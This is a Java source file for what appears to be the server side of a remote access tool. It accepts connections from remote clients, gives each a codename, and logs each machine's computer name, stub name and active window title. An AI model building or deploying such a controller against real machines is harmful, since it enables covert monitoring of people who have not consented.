package com.github.jafarlihi.service;

import com.github.jafarlihi.util.Client;
import com.github.jafarlihi.util.CodenameGenerator;
import io.reactivex.rxjava3.core.Observable;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class ClientListenerService {

    private static final Logger logger = LogManager.getLogger();
    public static ConcurrentHashMap<String, Client> clients = new ConcurrentHashMap<>();

    private ClientListenerService() {
    }

    public static void listen(int port) {
        Thread t = new Thread(() -> {
            while (true) {
                try {
                    handleConnections(port);
                } catch (IOException ex) {
                    logger.error("Failed to listen for clients, trying again. Exception: " + ex);
                }}});
        t.start();
    }

    public static Client getClient(String name) {
        for (Map.Entry<String, Client> entry : clients.entrySet())
            if (entry.getKey().equals(name))
                return entry.getValue();
        return null;
    }

    private static void handleConnections(int port) throws IOException {
        File codenamesFile = new File("codenames.json");
        codenamesFile.createNewFile();
        Path codenamesFilePath = Paths.get("codenames.json");
        String codenamesFileContent = "[]";
        ServerSocket serverSocket = new ServerSocket(port);
        logger.info("Listening for clients on port " + port);
        while (true) {
            Socket clientSocket = serverSocket.accept();
            try {
                codenamesFileContent = Files.readAllLines(codenamesFilePath).get(0);
            } catch (IndexOutOfBoundsException ex) {
            }
            JSONArray codenames = new JSONArray(codenamesFileContent);
            String name = findAddressInCodenames(
                    codenames,
                    ((InetSocketAddress) clientSocket.getRemoteSocketAddress()).getAddress().toString()
            );
            if (name == null) {
                name = CodenameGenerator.generateCodename();
                JSONObject newCodenameEntry = new JSONObject();
                newCodenameEntry.put("name", name);
                newCodenameEntry.put(
                        "address",
                        ((InetSocketAddress) clientSocket.getRemoteSocketAddress()).getAddress().toString()
                );
                codenames.put(newCodenameEntry);
                Files.write(codenamesFilePath, codenames.toString().getBytes());
            }
            Observable<String> clientObservable = Observable.create(emitter -> {
                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                while (true) {
                    String line = in.readLine();
                    if (line == null)
                        break;
                    emitter.onNext(line);
                }
            }).publish().autoConnect().cast(String.class);
            clients.put(name, new Client(clientSocket, clientObservable));
            final String finalName = name;
            Runnable task = () -> {
                clientObservable.subscribe((content) -> {
                    clients.get(finalName).lastSeen = LocalDateTime.now();
                    JSONObject contentJson = new JSONObject(content);
                    if (contentJson.has("computerName"))
                        clients.get(finalName).computerName = contentJson.getString("computerName");
                    if (contentJson.has("stubName"))
                        clients.get(finalName).stubName = contentJson.getString("stubName");
                    if (contentJson.has("activeWindowTitle"))
                        clients.get(finalName).activeWindowTitle = contentJson.getString("activeWindowTitle");
                }, (error) -> {});
            };
            Thread thread = new Thread(task);
            thread.start();
        }
    }

    private static String findAddressInCodenames(JSONArray codenames, String address) {
        for (int i = 0; i < codenames.length(); i++)
            if (codenames.getJSONObject(i).getString("address").equals(address))
                return codenames.getJSONObject(i).getString("name");
        return null;
    }
}
